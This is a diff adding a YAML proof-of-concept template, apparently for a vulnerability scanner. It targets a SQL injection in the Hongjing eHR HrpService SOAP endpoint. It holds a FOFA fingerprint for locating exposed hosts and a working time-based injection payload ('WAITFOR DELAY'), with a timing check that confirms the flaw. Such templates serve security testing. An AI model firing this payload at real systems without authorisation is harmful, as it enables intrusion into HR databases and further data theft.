@@ -1,0 +1,23 @@
+id: poc-yaml-hjsoft-ehr-hrpservice-sqli
+info:
+  name: 宏景eHR HrpService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /services/HrpService
+  headers:
+    Content-Type: application/xml
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:hr=\"http://www.hjsj.com/HrpService\">\n<soapenv:Header/>\n   <soapenv:Body>\n\
+    \      <hr:processResult>\n         <arg0>1);WAITFOR DELAY '0:0:{{.t1}}'--</arg0>\n\
+    \         <arg1></arg1>\n      </hr:processResult>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"processResultResponse") && contains(body,"HrpService")
+    && contains(content_type,"text/xml") && duration > t1 && duration < t2
+transport: http
